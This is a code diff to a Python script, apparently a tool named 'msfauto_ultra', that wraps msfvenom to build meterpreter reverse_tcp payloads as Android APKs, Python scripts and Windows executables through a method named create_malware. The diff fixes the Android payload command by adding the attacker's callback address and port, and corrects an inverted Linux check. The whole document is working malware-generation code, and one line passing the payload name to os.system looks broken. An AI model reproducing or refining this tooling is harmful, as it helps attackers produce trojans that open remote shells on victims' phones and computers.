@@ -15,7 +15,7 @@ class msfauto_ultra():
         else: self.payload = "windows/meterpreter/reverse_tcp"
     def create_malware(self): 
         create_output_folder()
-        if self.payload == "android/meterpreter/reverse_tcp": os.system(f"msfvenom -p android/meterpreter/reverse_tcp -f apk > /Output/{self.app_name}.apk")
+        if self.payload == "android/meterpreter/reverse_tcp": os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port1} R > {self.app_name}.apk")
         elif self.payload == "python/meterpreter/reverse_tcp": os.system(f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py")
         else: os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.ip} LPORT={self.port1} -f exe > Output/{self.app_name}.exe")
         os.system(self.payload)
@@ -115,7 +115,7 @@ def create_output_folder():
     try: os.mkdir("Output")
     except FileExistsError: pass
 def check_os():
-    if platform.uname()[0] == "Linux": print(Fore.RED + Style.BRIGHT + "[-] Your platform must be Kali Linux."), exit()
+    if platform.uname()[0] != "Linux": print(Fore.RED + Style.BRIGHT + "[-] Your platform must be Kali Linux."), exit()
     else: print(Fore.GREEN + Style.BRIGHT + "[+] OS Accepted! Continue...")
     time.sleep(5)
     clear()
